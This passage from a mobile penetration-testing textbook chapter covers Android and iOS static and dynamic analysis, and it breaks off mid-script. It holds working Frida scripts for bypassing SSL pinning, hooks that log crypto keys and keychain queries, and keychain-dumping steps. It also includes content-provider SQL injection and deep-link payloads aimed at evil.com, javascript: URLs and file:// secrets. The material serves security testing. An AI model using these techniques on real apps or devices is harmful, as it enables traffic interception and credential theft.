# Chapter 3: Mobile Application Security Testing

## Table of Contents
1. [Introduction to Mobile Security Testing](#introduction)
2. [Android Application Architecture](#android-architecture)
3. [Android Static Analysis](#android-static)
4. [Android Dynamic Analysis](#android-dynamic)
5. [iOS Application Architecture](#ios-architecture)
6. [iOS Static Analysis](#ios-static)
7. [iOS Dynamic Analysis](#ios-dynamic)
8. [Certificate Pinning Bypass](#cert-pinning)
9. [Insecure Data Storage](#insecure-storage)
10. [Inter-Process Communication Attacks](#ipc-attacks)
11. [Runtime Manipulation with Frida](#frida)
12. [OWASP Mobile Top 10](#owasp-mobile)

---

## Introduction to Mobile Security Testing

Mobile application security testing has become increasingly critical as smartphones have become the primary computing device for billions of users worldwide. Mobile apps handle sensitive personal data, financial information, and corporate secrets, making them prime targets for attackers. This chapter provides comprehensive coverage of mobile penetration testing methodologies for both Android and iOS platforms.

### Mobile Threat Landscape

The mobile threat landscape presents unique challenges:

**Device Fragmentation**: Android devices run various OS versions and custom manufacturer modifications, creating an inconsistent security posture across the ecosystem.

**App Store Security**: While Apple maintains strict App Store review processes and Google employs Play Protect, malicious apps still find their way onto official stores and alternative marketplaces.

**Side Loading**: Android's ability to install apps from unofficial sources increases exposure to malware and tampered applications.

**Physical Access**: Mobile devices are easily lost or stolen, making local data protection critical.

**Network Exposure**: Mobile apps frequently operate on untrusted networks (public WiFi, cellular), requiring robust transport security.

### Mobile Security Testing Methodology

**Pre-Engagement Activities**:
- Define testing scope (Android, iOS, or both)
- Identify app distribution methods (App Store, Play Store, Enterprise)
- Gather necessary testing devices and accounts
- Establish testing timelines and reporting requirements

**Reconnaissance**:
- Analyze app store listings and descriptions
- Review privacy policies and data handling claims
- Identify backend APIs and third-party services
- Gather app versions and update history

**Static Analysis**:
- Decompile and disassemble application binaries
- Analyze source code (if available) or decompiled code
- Review configuration files and resources
- Identify hardcoded secrets and credentials

**Dynamic Analysis**:
- Intercept and analyze network traffic
- Monitor runtime behavior and data handling
- Test authentication and session management
- Assess encryption and certificate validation

**Runtime Manipulation**:
- Instrument applications using Frida or similar tools
- Bypass security controls and root detection
- Modify application behavior at runtime
- Test for injection and hooking vulnerabilities

---

## Android Application Architecture

Understanding Android's architecture is fundamental to effective security testing. Android applications operate within a sophisticated security model designed to isolate apps and protect system resources.

### Android Architecture Components

**Linux Kernel**: Android builds upon the Linux kernel, providing process isolation, memory management, and security through user permissions.

**Hardware Abstraction Layer (HAL)**: Interfaces between hardware and the Android stack, allowing apps to interact with device hardware without kernel-level access.

**Android Runtime (ART)**: Replaces the Dalvik virtual machine in modern Android versions, using ahead-of-time (AOT) compilation for improved performance and security.

**Application Framework**: Provides high-level APIs for app development, including Activity Manager, Window Manager, Content Providers, and more.

**System Apps**: Pre-installed applications including phone, contacts, and settings that run with elevated privileges.

### Android Application Structure

An Android application is packaged as an APK (Android Package) containing:

**AndroidManifest.xml**: Defines app structure, permissions, components, and requirements:
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.app">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    
    <application
        android:allowBackup="true"
        android:debuggable="true"
        android:usesCleartextTraffic="true">
        
        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service android:name=".MyService"
            android:exported="false" />
            
        <receiver android:name=".MyReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
        
        <provider android:name=".MyProvider"
            android:authorities="com.example.app.provider"
            android:exported="false" />
    </application>
</manifest>
```

**Security-Relevant Manifest Attributes**:
- `android:allowBackup="true"`: Allows ADB backup of app data
- `android:debuggable="true"`: Enables debugging (should never be in production)
- `android:usesCleartextTraffic="true"`: Permits unencrypted HTTP traffic
- `android:exported`: Controls whether components can be accessed by other apps

### APK File Structure

```
app.apk
├── AndroidManifest.xml (compiled binary)
├── classes.dex (Dalvik/ART bytecode)
├── resources.arsc (compiled resources)
├── res/ (resources directory)
├── assets/ (raw asset files)
├── lib/ (native libraries)
│   ├── armeabi-v7a/
│   ├── arm64-v8a/
│   ├── x86/
│   └── x86_64/
├── META-INF/
│   ├── MANIFEST.MF
│   ├── CERT.SF
│   └── CERT.RSA (signature)
└── kotlin/ (Kotlin metadata if applicable)
```

### Android Security Model

**Application Sandbox**: Each Android app runs in its own sandbox with a unique Linux user ID, preventing direct access to other apps' data.

**Permission System**: Apps must declare required permissions in the manifest. Permissions are categorized as:
- Normal permissions (granted automatically)
- Dangerous permissions (require user approval)
- Signature permissions (granted to apps signed with same certificate)
- System/Development permissions (restricted to system apps)

**SELinux**: Enforces mandatory access controls, restricting what processes can access even beyond standard Linux permissions.

---

## Android Static Analysis

Static analysis involves examining application code without execution, revealing potential vulnerabilities, hardcoded secrets, and configuration issues.

### APK Extraction and Decompilation

**APK Extraction from Device**:
```bash
# Find package name
adb shell pm list packages | grep target

# Get APK path
adb shell pm path com.target.app

# Pull APK
adb pull /data/app/com.target.app-1/base.apk target-app.apk
```

**APK Decompilation**:
```bash
# Using apktool for resources and smali
apktool d target-app.apk -o target-app-decompiled

# Using jadx for Java source code
jadx target-app.apk -d target-app-java

# Using jadx GUI for interactive analysis
jadx-gui target-app.apk

# Using bytecode-viewer for multiple decompilers
bytecode-viewer target-app.apk
```

**Combining Decompilation Tools**:
```bash
# Complete decompilation workflow
mkdir -p analysis/{resources,java,smali}

# Extract resources and smali
apktool d target-app.apk -o analysis/resources --no-src

# Get Java source
jadx target-app.apk -d analysis/java

# Convert DEX to JAR for other tools
d2j-dex2jar target-app.apk -o target-app.jar
```

### AndroidManifest.xml Analysis

**Security-Focused Manifest Review**:
```bash
# Decode manifest only
apktool d target-app.apk --no-res --no-src
cat target-app/AndroidManifest.xml

# Automated manifest analysis with manifest-analysis
python3 -m pip install manifest-analysis
manifest-analysis -i target-app/AndroidManifest.xml
```

**Key Security Checks**:

1. **Debug Mode**:
```xml
<application android:debuggable="true" />
<!-- CRITICAL: Allows ADB debugging and data extraction -->
```

2. **Backup Enabled**:
```xml
<application android:allowBackup="true" />
<!-- WARNING: Allows ADB backup of app data -->
```

3. **Cleartext Traffic**:
```xml
<application android:usesCleartextTraffic="true" />
<!-- WARNING: Permits unencrypted HTTP traffic -->
```

4. **Exported Components**:
```xml
<activity android:exported="true" android:name=".SecretActivity" />
<!-- CHECK: Verify exported components have proper protections -->
```

### Source Code Analysis

**Hardcoded Secret Detection**:
```bash
# Using grep for basic secrets
grep -r -i -E "(password|secret|key|token)" target-app-java/

# Using truffleHog
trufflehog filesystem target-app-java/

# Using gitLeaks
gitleaks detect --source target-app-java/ --verbose

# Custom regex patterns
grep -r -P "AKIA[0-9A-Z]{16}" target-app-java/  # AWS Keys
grep -r -P "AIza[0-9A-Za-z_-]{35}" target-app-java/  # Google API Keys
grep -r -P "sk_live_[0-9a-zA-Z]{24,}" target-app-java/  # Stripe Keys
grep -r -P "[0-9a-f]{32}" target-app-java/  # Generic 32-char hex (API keys)
```

**Insecure Configuration Detection**:
```java
// Look for these patterns in decompiled code:

// 1. WebView with JavaScript enabled
WebView webView = findViewById(R.id.webview);
webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowFileAccess(true);  // Dangerous
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);  // Critical

// 2. Insecure HTTP connections
OkHttpClient client = new OkHttpClient.Builder()
    .hostnameVerifier((hostname, session) -> true)  // Disables hostname verification
    .build();

// 3. Weak cryptography
Cipher cipher = Cipher.getInstance("DES");  // Weak algorithm
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");  // ECB mode is insecure

// 4. Hardcoded encryption keys
private static final String SECRET_KEY = "HardcodedKey123";

// 5. Logging of sensitive data
Log.d("AUTH", "Password: " + password);
Log.e("API", "Token: " + authToken);
```

**Intent Analysis**:
```java
// Look for implicit intents that could be intercepted
Intent intent = new Intent();
intent.setAction("com.target.app.SEND_DATA");
intent.putExtra("sensitive_data", userData);
sendBroadcast(intent);

// Exported components receiving intents
public class DataReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String data = intent.getStringExtra("data");
        // Process without validation
    }
}
```

### Native Library Analysis

**Extracting and Analyzing Native Libraries**:
```bash
# Extract .so files from APK
unzip target-app.apk -d extracted-apk
cd extracted-apk/lib/arm64-v8a/

# Analyze with Ghidra
# Import .so file, analyze with default settings

# Using radare2
r2 -A libnative-lib.so
[0x00000000]> ii  # Show imports
[0x00000000]> iI  # Show binary info
[0x00000000]> iz  # Show strings in data section
[0x00000000]> afl  # List all functions

# Using strings for initial analysis
strings -n 8 libnative-lib.so | grep -i -E "(key|secret|password|token)"
```

### Automated Static Analysis

**MobSF (Mobile Security Framework)**:
```bash
# Run MobSF Docker container
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# Access at http://localhost:8000
# Upload APK through web interface
# Review generated report
```

**APKLeaks**:
```bash
# Install and run
pip3 install apkleaks
apkleaks -f target-app.apk -o leaks.txt

# With custom patterns
apkleaks -f target-app.apk -p custom-patterns.json -o leaks.txt
```

**QARK (Quick Android Review Kit)**:
```bash
# Clone and run
git clone https://github.com/linkedin/qark
cd qark && pip install -r requirements.txt
python qark.py --apk target-app.apk
```

---

## Android Dynamic Analysis

Dynamic analysis involves running the application and observing its behavior, network communications, and data handling in real-time.

### Dynamic Analysis Environment Setup

**Rooted Device/Emulator Setup**:
```bash
# Create Android Virtual Device (AVD)
avdmanager create avd -n pentest -k "system-images;android-30;google_apis;x86_64"
emulator -avd pentest -writable-system -no-snapshot

# Root the emulator
adb root
adb remount

# Or use Genymotion (recommended for pentesting)
# Install Genymotion, create device, install ARM translation if needed

# Install Magisk on physical device or emulator
adb push Magisk-v25.2.apk /sdcard/
adb shell pm install /sdcard/Magisk-v25.2.apk
```

**Frida Server Setup**:
```bash
# Download frida-server for device architecture
wget https://github.com/frida/frida/releases/download/16.0.8/frida-server-16.0.8-android-arm64.xz
unxz frida-server-16.0.8-android-arm64.xz

# Push to device
adb push frida-server-16.0.8-android-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server

# Run frida-server
adb shell /data/local/tmp/frida-server &

# Verify connection
frida-ps -U
```

### Network Traffic Interception

**Burp Suite Certificate Installation**:
```bash
# Export Burp CA certificate
# Proxy > Options > Import/export CA certificate > Export > Certificate in DER format

# Convert to PEM format
openssl x509 -inform DER -in cacert.der -out cacert.pem
openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1
mv cacert.pem <hash>.0

# Push to device
adb shell su -c "mount -o remount,rw /system"
adb push <hash>.0 /sdcard/
adb shell su -c "cp /sdcard/<hash>.0 /system/etc/security/cacerts/"
adb shell su -c "chmod 644 /system/etc/security/cacerts/<hash>.0"

# Alternative: Use Magisk module for systemless certificate installation
```

**Proxy Configuration**:
```bash
# Set global proxy
adb shell settings put global http_proxy 192.168.1.100:8080

# Remove proxy
adb shell settings put global http_proxy :0

# Or use iptables for transparent proxy
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 192.168.1.100:8080"
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 192.168.1.100:8080"
```

**Certificate Pinning Detection**:
```bash
# Using objection
default% android sslpinning disable

# Using Frida
frida -U -f com.target.app -l ssl-pinning-disable.js --no-pause

# Custom Frida script for SSL pinning bypass
```javascript
Java.perform(function() {
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.checkTrustedRecursive.implementation = function() {
        return [];
    };
});
```

### Runtime Instrumentation with Frida

**Basic Frida Hooking**:
```javascript
// hook_script.js
Java.perform(function() {
    // Hook specific class method
    var TargetClass = Java.use('com.target.app.CryptoUtils');
    
    TargetClass.encrypt.implementation = function(data) {
        console.log('[+] encrypt() called');
        console.log('[+] Input: ' + data);
        var result = this.encrypt(data);
        console.log('[+] Output: ' + result);
        return result;
    };
    
    // Hook constructor
    TargetClass.$init.implementation = function(key) {
        console.log('[+] CryptoUtils instantiated with key: ' + key);
        this.$init(key);
    };
});

// Run with: frida -U -f com.target.app -l hook_script.js --no-pause
```

**Intercepting Crypto Operations**:
```javascript
// crypto_hook.js
Java.perform(function() {
    // Hook javax.crypto.Cipher
    var Cipher = Java.use('javax.crypto.Cipher');
    
    Cipher.init.overload('int', 'java.security.Key').implementation = function(opmode, key) {
        console.log('[*] Cipher.init() called');
        console.log('[*] Operation: ' + (opmode === 1 ? 'ENCRYPT' : 'DECRYPT'));
        console.log('[*] Key: ' + bytesToHex(key.getEncoded()));
        return this.init(opmode, key);
    };
    
    Cipher.doFinal.overload('[B').implementation = function(input) {
        console.log('[*] Cipher.doFinal() called');
        console.log('[*] Input: ' + bytesToHex(input));
        var result = this.doFinal(input);
        console.log('[*] Output: ' + bytesToHex(result));
        return result;
    };
    
    // Helper function
    function bytesToHex(bytes) {
        var result = '';
        for (var i = 0; i < bytes.length; i++) {
            result += ('0' + (bytes[i] & 0xFF).toString(16)).slice(-2);
        }
        return result;
    }
});
```

**Shared Preferences Monitoring**:
```javascript
// prefs_hook.js
Java.perform(function() {
    var SharedPreferences = Java.use('android.app.SharedPreferencesImpl');
    var Editor = Java.use('android.app.SharedPreferencesImpl$EditorImpl');
    
    Editor.putString.implementation = function(key, value) {
        console.log('[SharedPreferences] putString: ' + key + ' = ' + value);
        return this.putString(key, value);
    };
    
    Editor.putInt.implementation = function(key, value) {
        console.log('[SharedPreferences] putInt: ' + key + ' = ' + value);
        return this.putInt(key, value);
    };
});
```

### Database and File System Analysis

**Extracting App Data**:
```bash
# Backup app data (if backup enabled)
adb backup -f target.ab com.target.app
# Convert to tar
java -jar abe.jar unpack target.ab target.tar

# Direct data access (root required)
adb shell su -c "tar -czf /sdcard/target-data.tar.gz /data/data/com.target.app"
adb pull /sdcard/target-data.tar.gz

# SQLite database analysis
adb shell "run-as com.target.app cat databases/app.db" > app.db
sqlite3 app.db .tables
sqlite3 app.db "SELECT * FROM users;"
```

**Shared Preferences Extraction**:
```bash
# Pull shared preferences
adb shell "run-as com.target.app cat shared_prefs/app_prefs.xml" > app_prefs.xml

# Analyze for sensitive data
cat app_prefs.xml | grep -i -E "(password|token|key|secret)"
```

---

## iOS Application Architecture

iOS presents a more controlled environment than Android, with stricter security mechanisms and a closed ecosystem. Understanding iOS architecture is essential for effective security testing.

### iOS Security Architecture

**Secure Boot Chain**: iOS devices verify each step of the boot process through cryptographic signatures, preventing unauthorized bootloaders or kernels.

**Code Signing**: All iOS apps must be signed with a valid certificate from Apple, preventing the execution of unsigned or tampered code.

**App Sandbox**: Apps run in individual sandboxes with restricted access to the file system, network, and hardware resources.

**Data Protection**: iOS uses hardware-backed encryption (AES-256) to protect data, with different protection classes determining when data is accessible.

**Address Space Layout Randomization (ASLR)**: Randomizes memory locations to prevent exploitation of memory corruption vulnerabilities.

### iOS Application Structure

iOS applications are distributed as IPA (iOS App Store Package) files, which are ZIP archives containing:

```
AppName.app/
├── AppName (executable binary)
├── Info.plist (app configuration)
├── _CodeSignature/ (code signing)
│   └── CodeResources
├── Frameworks/ (embedded frameworks)
├── PlugIns/ (app extensions)
├── Resources/
│   ├── Images, storyboards, etc.
│   └── Assets.car
└── embedded.mobileprovision (provisioning profile)
```

### IPA Extraction and Analysis

**Extracting IPA from Device**:
```bash
# Using ipainstaller (jailbroken device)
ipainstaller -l  # List installed apps
ipainstaller -b com.target.app  # Backup app

# Using frida-ios-dump
git clone https://github.com/AloneMonkey/frida-ios-dump.git
cd frida-ios-dump
./dump.py com.target.app

# Using objection
objection --gadget com.target.app explore
ios fs list
```

**IPA Decryption**: Encrypted binaries must be decrypted before analysis:
```bash
# Using Clutch (on jailbroken device)
Clutch -i  # List apps
Clutch -d com.target.app  # Decrypt app

# Using frida-ios-dump (recommended)
./dump.py com.target.app
```

---

## iOS Static Analysis

iOS static analysis involves examining the application binary, resources, and metadata without execution.

### Binary Analysis

**Class Dump**:
```bash
# Extract class information
class-dump -H TargetApp.app/TargetApp -o headers/

# Using class-dump-swift for Swift apps
class-dump-swift -H TargetApp.app/TargetApp -o headers/

# strings analysis
strings -a TargetApp.app/TargetApp | grep -i -E "(password|secret|key|token)"

# nm for symbol table
nm -u TargetApp.app/TargetApp
```

**Info.plist Analysis**:
```bash
# Convert binary plist to XML
plutil -convert xml1 Info.plist -o Info.xml

# Security-relevant keys to check:
# NSAppTransportSecurity - ATS configuration
# UIFileSharingEnabled - Allows iTunes file sharing
# LSSupportsOpeningDocumentsInPlace - File access
# NSAllowsArbitraryLoads - HTTP allowance
```

**Key Info.plist Security Checks**:
```xml
<!-- Insecure ATS configuration -->
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <true/>  <!-- Allows HTTP connections -->
    <key>NSExceptionDomains</key>
    <dict>
        <key>insecure-api.com</key>
        <dict>
            <key>NSExceptionAllowsInsecureHTTPLoads</key>
            <true/>
        </dict>
    </dict>
</dict>

<!-- File sharing enabled -->
<key>UIFileSharingEnabled</key>
<true/>
<key>LSSupportsOpeningDocumentsInPlace</key>
<true/>
```

### Disassembly and Decompilation

**Hopper Disassembler**:
```bash
# Open binary in Hopper
# Use pseudocode view for high-level analysis
# Search for strings and cross-references
# Analyze function flow
```

**Ghidra Analysis**:
```bash
# Create new project in Ghidra
# Import binary (File > Import File)
# Select ARM architecture for iOS
# Run Auto Analyze with default settings
```

**Radare2 Analysis**:
```bash
# iOS binary analysis
r2 -A TargetApp.app/TargetApp

[0x00000000]> i  # File information
[0x00000000]> ii  # Imports
[0x00000000]> iI  # Binary info
[0x00000000]> iz~password  # Search strings
[0x00000000]> afl~crypt  # Find crypto functions
[0x00000000]> s sym._encryptData  # Go to function
[0x00000000]> pdf  # Print disassembly
```

### Automated iOS Analysis

**MobSF for iOS**:
```bash
# Upload IPA to MobSF web interface
# Review iOS-specific findings:
# - Binary analysis
# - Transport security
# - Code signing
# - Permission usage
```

**iOS Security Suite**:
```bash
# Run during dynamic testing
# Checks for jailbreak detection effectiveness
# Validates SSL pinning
# Tests keychain storage
```

---

## iOS Dynamic Analysis

Dynamic analysis on iOS requires a jailbroken device or specific tools for instrumenting applications.

### Jailbreak Setup

**Checkra1n (A11 and below)**:
```bash
# Download checkra1n from checkra.in
# Enter DFU mode on device
# Run checkra1n and follow instructions
# Install Cydia package manager
```

**Unc0ver (A12-A14)**:
```bash
# Download Unc0ver from official site
# Sideload with AltStore or Cydia Impactor
# Run jailbreak from device
```

**Post-Jailbreak Setup**:
```bash
# Install essential packages via Cydia
# OpenSSH, Core Utilities, APT Strict
# File managers: Filza, NewTerm2

# Install Frida
# Add https://build.frida.re to Cydia sources
# Install Frida package
```

### Network Traffic Analysis

**Burp Suite Setup**:
```bash
# Export Burp CA certificate
# Host certificate on local server
# Download on iOS device and install profile
# Settings > General > VPN & Device Management > Install
# Trust certificate: Settings > General > About > Certificate Trust Settings

# Configure proxy
# Settings > Wi-Fi > [Network] > HTTP Proxy > Manual
# Enter Burp proxy IP and port
```

**SSL Kill Switch 2**:
```bash
# Bypass SSL pinning system-wide
# Install from Cydia
# Enable in Settings app
# All apps will trust any certificate
```

### Frida iOS Instrumentation

**Basic iOS Hooking**:
```javascript
// ios_hook.js
if (ObjC.available) {
    console.log('[*] Objective-C runtime available');
    
    // Hook NSString method
    var NSString = ObjC.classes.NSString;
    NSString["+ stringWithUTF8String:"].implementation = function(arg) {
        var result = this["+ stringWithUTF8String:"](arg);
        console.log('[NSString stringWithUTF8String:] => ' + result);
        return result;
    };
    
    // Hook URL loading
    var NSURLSession = ObjC.classes.NSURLSession;
    var dataTaskWithRequest = NSURLSession["- dataTaskWithRequest:completionHandler:"];
    
    Interceptor.attach(dataTaskWithRequest.implementation, {
        onEnter: function(args) {
            var request = ObjC.Object(args[2]);
            console.log('[NSURLSession] Request: ' + request.HTTPMethod() + ' ' + request.URL());
            console.log('[NSURLSession] Headers: ' + request.allHTTPHeaderFields());
        }
    });
} else {
    console.log('[!] Objective-C runtime not available');
}
```

**Keychain Access Monitoring**:
```javascript
// keychain_hook.js
if (ObjC.available) {
    var SecItemAdd = Module.findExportByName('Security', 'SecItemAdd');
    var SecItemCopyMatching = Module.findExportByName('Security', 'SecItemCopyMatching');
    
    Interceptor.attach(SecItemAdd, {
        onEnter: function(args) {
            var query = ObjC.Object(args[0]);
            console.log('[SecItemAdd] Query: ' + query);
        }
    });
    
    Interceptor.attach(SecItemCopyMatching, {
        onEnter: function(args) {
            var query = ObjC.Object(args[0]);
            console.log('[SecItemCopyMatching] Query: ' + query);
        },
        onLeave: function(retval) {
            console.log('[SecItemCopyMatching] Result: ' + retval);
        }
    });
}
```

**Cryptographic Operations Hooking**:
```javascript
// crypto_hook_ios.js
if (ObjC.available) {
    // Hook CommonCrypto functions
    var CCCrypt = Module.findExportByName('libcommonCrypto.dylib', 'CCCrypt');
    
    Interceptor.attach(CCCrypt, {
        onEnter: function(args) {
            console.log('[CCCrypt] Operation: ' + args[0]);  // kCCEncrypt/kCCDecrypt
            console.log('[CCCrypt] Algorithm: ' + args[1]);
            console.log('[CCCrypt] Key length: ' + args[5]);
            console.log('[CCCrypt] Data length: ' + args[8]);
        }
    });
}
```

### iOS File System Analysis

**Application Data Extraction**:
```bash
# Using objection
objection --gadget com.target.app explore
ios fs list
ios fs cat /var/mobile/Containers/Data/Application/UUID/Documents/userdata.plist

# Using SSH (jailbroken)
ssh root@device-ip

# Navigate to app container
cd /var/mobile/Containers/Data/Application/
ls -la

# Find target app
grep -r "com.target.app" . 2>/dev/null

# Extract data
tar -czf /tmp/app-data.tar.gz /var/mobile/Containers/Data/Application/UUID/
scp root@device-ip:/tmp/app-data.tar.gz ./
```

**Keychain Dumper**:
```bash
# Clone and build
git clone https://github.com/ptoomey3/Keychain-Dumper.git
cd Keychain-Dumper
make

# Run on device (jailbroken)
./KeychainDumper -s  # Search for generic passwords
./KeychainDumper -g  # Search for internet passwords
```

---

## Certificate Pinning Bypass

Certificate pinning prevents man-in-the-middle attacks by embedding expected certificates or public keys within the application. Bypassing pinning is often necessary for dynamic analysis.

### Android Certificate Pinning Bypass

**Frida Universal SSL Pinning Bypass**:
```javascript
// ssl_bypass.js
Java.perform(function() {
    console.log('[*] Starting SSL Pinning Bypass');
    
    // Bypass 1: OkHostnameVerifier
    try {
        var OkHostnameVerifier = Java.use('okhttp3.internal.tls.OkHostnameVerifier');
        OkHostnameVerifier.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession').implementation = function() {
            console.log('[+] OkHostnameVerifier bypassed');
            return true;
        };
    } catch(e) {}
    
    // Bypass 2: TrustManagerImpl (Android)
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.checkTrustedRecursive.implementation = function() {
            console.log('[+] TrustManagerImpl bypassed');
            return [];
        };
    } catch(e) {}
    
    // Bypass 3: X509TrustManager
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    var TrustManager = Java.registerClass({
        name: 'com.example.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function() {},
            checkServerTrusted: function() {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var TrustManagers = [TrustManager.$new()];
    var SSLContext_init = SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;', 
        '[Ljavax.net.ssl.TrustManager;', 
        'java.security.SecureRandom'
    );
    
    SSLContext_init.implementation = function(km, tm, random) {
        console.log('[+] SSLContext.init() hooked');
        SSLContext_init.call(this, km, TrustManagers, random);
    };
    
    console.log('[*] SSL Pinning Bypass Active');
});
```

**Objection SSL Pinning Disable**:
```bash
# Using objection for quick bypass
objection --gadget com.target.app explore

android sslpinning disable
# or
ios sslpinning disable

# If that fails, try with custom bypass:
android hooking set return_value com.target.app.SecurityUtils.isCertificateValid false
```

### iOS Certificate Pinning Bypass

**SSL Kill Switch 2**:
```bash
# Install via Cydia
# Enable in Settings
# All apps trust any certificate
```

**Frida iOS SSL Bypass**:
```javascript
// ios_ssl_bypass.js
if (ObjC.available) {
    // Hook NSURLSession delegate
    var NSURLSession = ObjC.classes.NSURLSession;
    var NSURLSessionTask = ObjC.classes.NSURLSessionTask;
    
    // Hook didReceiveChallenge
    var didReceiveChallenge = ObjC.classes['TargetApp.NetworkManager']['- URLSession:didReceiveChallenge:completionHandler:'];
    
    Interceptor.attach(didReceiveChallenge.implementation, {
        onEnter: function(args) {
            console.log('[NSURLSession] didReceiveChallenge called');
            var handler = new ObjC.Block(args[4]);
            handler.implementation = function(disposition, credential) {
                // Accept all credentials
                this(0, ObjC.classes.NSURLCredential.credentialForTrust_(args[3].protectionSpace().serverTrust()));
            };
        }
    });
    
    // Hook AFNetworking if used
    try {
        var AFSecurityPolicy = ObjC.classes.AFSecurityPolicy;
        AFSecurityPolicy['- setAllowInvalidCertificates:'].implementation = function(value) {
            this['- setAllowInvalidCertificates:'](true);
            console.log('[AFNetworking] Allowing invalid certificates');
        };
        AFSecurityPolicy['- setValidatesDomainName:'].implementation = function(value) {
            this['- setValidatesDomainName:'](false);
            console.log('[AFNetworking] Disabling domain validation');
        };
    } catch(e) {}
}
```

---

## Insecure Data Storage

Mobile applications frequently store sensitive data insecurely, making it accessible to attackers with physical access or malicious apps.

### Android Data Storage Analysis

**Shared Preferences**:
```bash
# Location: /data/data/com.target.app/shared_prefs/
adb shell "run-as com.target.app ls shared_prefs/"
adb shell "run-as com.target.app cat shared_prefs/app_settings.xml"

# Check for MODE_WORLD_READABLE/MODE_WORLD_WRITEABLE (deprecated but still found)
# Look for Context.MODE_PRIVATE alternatives
```

**Internal Storage**:
```bash
# Location: /data/data/com.target.app/files/
adb shell "run-as com.target.app ls files/"
adb shell "run-as com.target.app cat files/config.json"
```

**External Storage**:
```bash
# Location: /sdcard/Android/data/com.target.app/
adb shell ls /sdcard/Android/data/com.target.app/
adb shell cat /sdcard/Android/data/com.target.app/cache/api_responses.json
```

**SQLite Database Security**:
```bash
# Location: /data/data/com.target.app/databases/
adb shell "run-as com.target.app ls databases/"
adb shell "run-as com.target.app cat databases/app.db" > app.db

# Analyze
sqlite3 app.db .tables
sqlite3 app.db "SELECT * FROM sensitive_data;"

# Check for SQLCipher encryption
# If encrypted, extract key from memory or code
```

**KeyStore Analysis**:
```bash
# Android Keystore files
# Location: /data/misc/keystore/user_0/
# Requires root access

adb shell su -c "ls /data/misc/keystore/user_0/"
```

### iOS Data Storage Analysis

**Data Protection Classes**:
```bash
# Check data protection class
# Using objection
objection --gadget com.target.app explore
ios fs list

# Files should use:
# - NSFileProtectionComplete (most secure)
# - NSFileProtectionCompleteUnlessOpen
# - NSFileProtectionCompleteUntilFirstUserAuthentication
# Avoid: NSFileProtectionNone
```

**Plist Analysis**:
```bash
# Find plist files
find /var/mobile/Containers/Data/Application/ -name "*.plist" 2>/dev/null

# Convert and analyze
plutil -convert xml1 Preferences.plist -o Preferences.xml
cat Preferences.xml
```

**Keychain Analysis**:
```bash
# Dump keychain with Keychain-Dumper
./KeychainDumper > keychain.txt
grep -i "password\|token\|secret\|key" keychain.txt

# Analyze protection attributes
# kSecAttrAccessibleWhenUnlocked (good)
# kSecAttrAccessibleAfterFirstUnlock (acceptable)
# kSecAttrAccessibleAlways (insecure)
```

**Core Data and SQLite**:
```bash
# Find Core Data stores
find /var/mobile/Containers/Data/Application/ -name "*.sqlite" 2>/dev/null
find /var/mobile/Containers/Data/Application/ -name "*.sqlite-wal" 2>/dev/null

# Extract and analyze
scp root@device:/var/mobile/Containers/Data/Application/UUID/Library/Application\ Support/AppName.sqlite ./
sqlite3 AppName.sqlite .tables
```

### Automated Storage Analysis

** objection Storage Commands**:
```bash
objection --gadget com.target.app explore

# Android
android root disable  # Disable root detection
android hooking list activities
android hooking search classes database
android hooking search methods "getSharedPreferences"

# iOS
ios jailbreak disable
ios hooking list classes
ios hooking search methods "NSUserDefaults"
ios keychain dump
```

---

## Inter-Process Communication Attacks

Mobile apps frequently communicate through IPC mechanisms, which can be exploited if not properly secured.

### Android IPC Security

**Intent Analysis**:
```bash
# Enumerate exported components
# From AndroidManifest.xml
# Look for: android:exported="true"

# Test with adb am (Activity Manager)
adb shell am start -n com.target.app/.SecretActivity
adb shell am start -a "com.target.app.ACTION_SECRET"
adb shell am broadcast -a "com.target.app.BROADCAST_ACTION"
```

**Content Provider Testing**:
```bash
# Find content providers
adb shell "run-as com.target.app dumpsys package | grep -A 5 'Content Providers'"

# Query content provider
adb shell content query --uri content://com.target.app.provider/users

# Insert data (if vulnerable)
adb shell content insert --uri content://com.target.app.provider/users \
    --bind name:s:attacker --bind email:s:attacker@evil.com

# SQL injection in Content Provider
adb shell content query --uri "content://com.target.app.provider/users' OR '1'='1"
```

**Deep Link Testing**:
```bash
# Test deep links
adb shell am start -W -a android.intent.action.VIEW \
    -d "targetapp://open?url=https://evil.com"

# Test for XSS in WebView via deep link
adb shell am start -W -a android.intent.action.VIEW \
    -d "targetapp://web?url=javascript:alert(1)"

# Test for arbitrary URL loading
adb shell am start -W -a android.intent.action.VIEW \
    -d "targetapp://load?file:///data/data/com.target.app/shared_prefs/secrets.xml"
```

**Intent Interception with Frida**:
```javascript
// intent_hook.js
Java.perform(function() {
    var Intent = Java.use('android.content.Intent');
    var Activity = Java.use('android.app.Activity');
    
